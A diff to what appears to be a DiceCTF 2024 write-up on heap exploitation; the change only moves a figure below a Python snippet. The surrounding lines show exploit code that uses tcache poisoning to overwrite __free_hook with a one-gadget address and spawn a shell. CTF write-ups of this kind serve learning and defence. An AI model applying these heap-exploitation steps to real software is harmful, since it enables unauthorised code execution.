@@ -229,8 +229,6 @@ Now, we can allocate a smaller chunk **k** that will be placed within **c**, and
 
 With full control over the metadata of the chunk **k**, since it is contained within **c**, we can employ **tcache poisoning**. This enables us to overwrite the `__free_hook` with the address of the *one gadget*.
 
-{{< figure src="/img/dicectf_quals_2024/heap_10.png" position="left" caption="Tcache before last malloc" captionPosition="left">}}
-
 ```python
 free(c)
 
@@ -239,6 +237,8 @@ alloc(0x128, b"K" * (0x128 - 40) + p64(libc.symbols["__free_hook"]) + p64(0))
 alloc(0x38, "")
 alloc(0x38, p64(libc.address + 0x10a2fc))
 ```
+
+{{< figure src="/img/dicectf_quals_2024/heap_10.png" position="left" caption="Tcache before last malloc" captionPosition="left">}}
 
 Now, after freeing a chunk, a shell will be spawned.
 
